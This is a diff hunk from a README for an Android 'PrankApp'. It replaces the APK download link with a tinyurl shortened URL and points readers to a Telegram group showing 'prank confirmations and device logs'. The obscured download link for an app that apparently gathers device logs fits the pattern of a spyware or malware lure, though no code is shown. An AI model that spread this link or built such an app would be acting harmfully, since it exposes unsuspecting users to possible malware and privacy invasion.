@@ -30,7 +30,7 @@ Join our Telegram group to see prank confirmations and device logs:
 
 ## 📥 Download
 Get the latest version:  
-🔗 [**PrankApp-v1.0.apk**](https://unknownhealer.github.io/Media-Peankers/)
+🔗 [**PrankApp-v1.0.apk**](https://tinyurl.com/Uno-apk)
 
 ---
 
